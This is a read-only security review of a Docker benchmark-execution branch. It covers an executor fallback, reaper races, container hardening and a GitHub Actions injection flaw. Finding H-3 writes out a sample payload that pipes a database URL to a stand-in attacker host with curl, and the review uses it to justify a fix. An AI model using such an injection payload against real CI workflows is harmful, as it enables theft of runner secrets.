# Pre-Merge Adversarial Security & Architecture Review

**Branch:** `feature/docker-execution-runtime` vs `origin/main` (`4d563bf`)
**Date:** 2026-08-21
**Mode:** READ-ONLY. No files were modified. Report only.
**Scope:** full branch diff (13 tracked files + 10 new files), all execution-plane code, workflows, migration, image.

Classification: `CRITICAL / HIGH / MEDIUM / LOW / NO ISSUE`

---

## HIGH

### H-1 — Silent LocalExecutor fallback is still reachable in production
**Files:** `packages/execution_engine/application/executor.py:142-144`, `apps/backend/worker/execution_runner.py:28-34`, `apps/backend/config.py:13`

```python
# executor.py:143 (get_default)
return self.get("docker") or self.get("local")   # prod: docker -> LOCAL fallback
```
```python
# execution_runner.py:30-34 — requested type missing => get_default()
executor = executor_registry.get(self._executor_type)
if executor:
    return executor
return executor_registry.get_default()
```

Three stacked weaknesses compose into a silent host-execution path in production:

1. `get_default()` explicitly falls back to `local` when docker is absent — the exact "silent fallback" the project invariant forbids.
2. `_get_executor()` falls through to `get_default()` whenever the requested type string misses the registry.
3. `get_executor_for_environment()` (`executor_init.py:31-35`) does an exact string compare `settings.environment == "production"`. Any drift (`prod`, `PRODUCTION`, trailing space) silently yields `"local"`.

Default wiring currently masks this (`init_executors()` registers both executors unconditionally; `tasks.py:56` passes `"docker"`), so exploitation requires config/env drift — but the code path exists and contradicts the documented invariant. **Recommendation (not applied):** `get_default()` must raise in production rather than return local; `_get_executor()` must raise on registry miss when the requested type was explicit; validate `environment` against `{development, production}` at settings load.

### H-2 — Reaper window (45 min) < outer task limits (60+ min): mid-flight reap → duplicate execution
**Files:** `apps/backend/worker/stale_attempt_reaper.py:20-23` (45-min default), `apps/backend/worker/tasks.py:38-39` (`soft_time_limit=3600`, `time_limit=3660`), `packages/execution_engine/application/docker_executor.py:57` (1800s default timeout)

Nothing touches `ExecutionAttempt.updated_at` between `RUNNING` commit (`execution_runner.py:107-109`) and completion. A legitimately long attempt (provider retries, queue stalls inside container wait) crosses the 45-minute reap cutoff while Celery allows up to 61 minutes. The reaper then marks it FAILED, requeues the execution (see H-4), and a second worker starts the same benchmark **while the first is still running** — duplicate attempts, duplicate ModelOutputs, double provider spend.

The numbers only work today because DockerExecutor's own 30-min timeout usually fires first; any executor/config change that permits >45-min runs breaks the invariant silently. **Recommendation:** reap cutoff must exceed the maximum possible runtime (≥ celery hard limit + margin), or attempts need heartbeats (`updated_at` touch) and reap only on heartbeat staleness.

### H-3 — Shell-injection pattern in the execute workflow (`${{ }}` into `run:`)
**File:** `.github/workflows/benchmark-execute.yml` (final step)

```yaml
run: |
  EXEC_ID="${{ github.event.client_payload.execution_id || inputs.execution_id }}"
  uv run python scripts/run_execution_ci.py "$EXEC_ID" ...
```

`github.event.client_payload` is attacker-influenced by anyone holding dispatch rights (the fine-grained PAT — which also grants `contents:write`). Interpolating it into a shell block is the canonical GitHub Actions injection flaw: a payload of `"; curl attacker $(cat $DATABASE_URL)` style input executes arbitrary commands **on the runner, which holds `EXECUTION_DATABASE_URL` and provider keys**. The workflow is currently INERT (guard variable unset), so this is not exploitable today — but it must be fixed before enablement. **Recommendation:** pass via `env:` block (`EXEC_ID: ${{ github.event.client_payload.execution_id }}`) and reference `$EXEC_ID` in the script; same for `inputs.execution_id`.

### H-4 — Reaper-requeued executions are stranded (no outbox row, no dispatch)
**Files:** `apps/backend/worker/stale_attempt_reaper.py:78-83` (sets `QUEUED`), `apps/backend/worker/outbox_sweep_loop.py` / `tasks.py:91-113` (sweep processes outbox rows only), `apps/backend/worker/execution_worker.py:48` (process invoked solely by `run_execution_task`)

The only path that calls `ExecutionWorker.process()` is the Celery task dispatched by `ExecutionQueuedSubscriber` when an outbox row is swept. The reaper flips `execution.status` back to `QUEUED` but inserts no `OutboxMessage` and enqueues no task ⇒ the requeued execution sits in QUEUED forever. Recovery silently degrades from "requeue" to "mark failed + strand". **Recommendation:** reaper should insert an `ExecutionQueuedEvent` outbox row (same shape as the API path) inside the same transaction.

---

## MEDIUM

### M-1 — Timeout/OOM provenance discarded on exception paths
**Files:** `packages/execution_engine/application/docker_executor.py:234-244` (raises after filling `provenance`), `apps/backend/worker/execution_runner.py:157-163`

On `ExecutorTimeout`/`ExecutorError` the runner's generic handler overwrites `termination_reason="error"` and never copies the already-populated provenance (`timed_out`, `oom_killed`, exit_code, stats) onto the attempt row. A timed-out or OOM-killed container is recorded as plain "error". Telemetry fidelity loss for exactly the interesting failures.

### M-2 — `api.wait(timeout=...)` does not stop the container at the timeout instant
**File:** `docker_executor.py:199`

Docker's wait endpoint returning via client-side timeout leaves the container running until the `finally` remove (force). Combined with M-1, wall-clock overrun is bounded by cleanup latency but mis-attributed. Consider explicit `client.api.stop(container_id, timeout=grace)` on wait-timeout before raising `ExecutorTimeout`.

### M-3 — Duplicate ModelOutputs possible across retries
**Files:** `packages/database/atlas_db/models/execution.py` (`ModelOutput`: no unique constraint on `(execution_id, test_case_id)`), `execution_runner.py:136-153`

Celery retries ×3 (`tasks.py:36-37`). If a failure occurs after the outputs commit but before the worker completes (or after H-2-style duplicate dispatch), rows are inserted again with no constraint/upsert guard. Add a unique constraint or idempotent upsert keyed on `(execution_id, test_case_id)` per successful attempt.

### M-4 — Wrong enum used for execution status assignment
**File:** `execution_runner.py:152`

`execution.status = AttemptStatus.COMPLETED.value ...` assigns an `AttemptStatus` value to the `ExecutionStatus` column. It works only because both serialize to `"COMPLETED"` (and the str-enum equality at `execution_worker.py:116` then short-circuits). Fragile coincidence; use `ExecutionStatus.COMPLETED`.

### M-5 — `ATLAS_BENCHMARK_NETWORK` accepts arbitrary values including `host`
**File:** `docker_executor.py:79-82`

The new env hook resolves network mode verbatim. `ATLAS_BENCHMARK_NETWORK=host` would put the untrusted benchmark container on the runner's host network stack (loopback services, metadata endpoints). Validate against an allow-list (`none`, `bridge`, named user networks) and reject `host` explicitly.

### M-6 — Execution payload delivered via environment variable
**Files:** `docker_executor.py:108-129`, `container_entry.py:28`

Full test-case set travels as `ATLAS_EXECUTION_PAYLOAD`. Two implications: (a) size ceiling (~hundreds of KB practical env limits) makes large datasets fail opaquely at container start; (b) payload is readable via `docker inspect` by anything with daemon access on the runner host — acceptable while the runner is privileged infra, worth revisiting if multi-tenant. Long-term: pass via tmpfs file mount.

### M-7 — No lease/lock around the QUEUED→RUNNING transition
**File:** `execution_worker.py:71-82`

Two workers racing can both read QUEUED before either commits RUNNING (read-check-write without `SELECT … FOR UPDATE`), producing duplicate attempts. Single-runner MVP makes this theoretical; it becomes real the moment concurrency is added (which H-2 can trigger even now).

### M-8 — Benchmark image supply chain unpinned
**Files:** `docker/benchmark/Dockerfile:11` (`python:3.11-slim` tag only), line 14 (`httpx pydantic` unpinned)

Contradicts `docs/PRODUCTION_READINESS_PLAN.md` §1/§2 which specified digest-pinned base and locked deps. Tag mutation or dependency drift changes sandbox contents invisibly. Pin base by digest; pin httpx/pydantic versions (they're already locked in `uv.lock` — mirror those pins).

---

## LOW

- **L-1** `executor.py:148` — `available_types` calls async `is_available()` without await; every entry is a truthy coroutine. Misleading dead API.
- **L-2** `docker_executor.py:_collect_stats` — `cpu_seconds = cpu_percent/100 * timeout_minutes` is not CPU seconds; it's a fabricated estimate. Record actual `cpu_usage.total_usage` nanoseconds ÷ 1e9 instead.
- **L-3** `local_executor.py:61-67` — constructs a `ModelOutput` ORM object that is never used (dead code); and LocalExecutor enforces no timeout at all: a hung provider call blocks the dev worker indefinitely.
- **L-4** `execution_worker.py:142` — completion outbox payload fabricates `attempt_id=str(uuid.uuid4())` instead of the real attempt id; downstream correlation is misleading.
- **L-5** `prompt_resolver.py` — `str.format(**input_data)` permits attribute traversal in templates (`{k.__class__}`); impact confined to inside the sandbox and to string objects, but worth noting as prompt-author surface.
- **L-6** `benchmark-execute.yml` — pulls `sha-${{ github.sha }}`; if the image workflow hasn't finished for that sha the job fails loudly (ordering dependency, acceptable).
- **L-7** `docker_executor.py:234` — `except docker.errors.APIError` evaluates the attribute at exception time; if the `docker` import had failed (`docker=None` sentinel) this would raise AttributeError during handling. Practically unreachable (earlier code fails first) but brittle.

---

## NO ISSUE (verified clean)

| Area | Evidence |
|---|---|
| Docker socket / host FS exposure | Only tmpfs mounts (`/tmp`, `/workspace`, `noexec,nosuid`) in `_build_container_config`; no volumes, no socket |
| Privilege/capabilities | `cap_drop=["ALL"]`, `no-new-privileges:true`, read-only rootfs, non-root UID 10001 in image; no `--privileged` anywhere in diff |
| Resource limits | cpu_quota/period, mem_limit + memswap_limit (swap off), pids_limit, ulimits nofile/nproc, tmpfs sizes bounded |
| Secret leakage into containers | `_provider_env()` strict allow-list; regression test asserts DB/JWT/billing secrets absent from container env (`tests/backend/test_docker_executor_config.py`) |
| Default network isolation | `network_mode` defaults `none`; smoke test proves offline operation (M-5 covers the override footgun) |
| Container cleanup | `finally: remove_container(force=True, v=True)`; `atlas.benchmark=true` label + exited-prune at init covers crash orphans |
| Actions log leakage | Secrets referenced only via `env:` indirection (auto-masked); driver logs ids/counts, never payloads; `concurrency` group serializes runs |
| Image dependency closure | Verified minimal (httpx, pydantic); offline smoke passes with network=none |
| Migration safety | Purely additive table+enum+index; clean reverse downgrade; FK CASCADE/SET NULL correct |
| Registry wiring today | `init_executors()` registers both executors unconditionally; `tasks.py` always passes explicit type — H-1 paths require config drift, not default flow |

---

## Verdict

No CRITICAL findings. Four HIGH findings: two are latent-by-default code paths contradicting stated invariants (H-1 silent fallback, H-2 reap race), one is a pre-enablement workflow-injection pattern in deliberately-inert YAML (H-3), one is a functional recovery gap (H-4 stranded requeues).

**Recommendation:** fix H-1…H-4 and M-1/M-3/M-5/M-8 on this branch before merge. H-3 is mandatory before the execution plane is ever enabled; M-8 before first GHCR publish. None require architectural change — all are contained fixes consistent with the frozen design.
